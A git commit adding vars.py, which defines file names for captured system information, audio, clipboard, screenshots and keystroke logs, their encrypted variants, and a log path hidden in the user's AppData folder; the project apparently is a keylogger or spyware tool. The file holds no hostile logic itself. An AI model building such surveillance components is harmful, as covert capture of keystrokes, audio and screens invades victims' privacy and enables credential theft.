66b4cf40347a99ade108654e699cf4538aeec8d6
Harsh Mishra <hmisraji07@gmail.com>
2022-04-14 03:40:58 +0530

    vars.py added for tracking

---
+++ vars.py
@@ -0,0 +1,10 @@
+from os import environ
+system_information = "system.txt"
+audio_information = "audio.wav"
+clipboard_information = "clipboard.txt"
+screenshot_information = "screenshot.png"
+keys_information = "key_log.txt"
+system_information_e = 'e_system.txt'
+clipboard_information_e = 'e_clipboard.txt'
+keys_information_e = 'e_keys_logged.txt'
+key_log_path = "%s\\appdata\\"%environ['USERPROFILE']
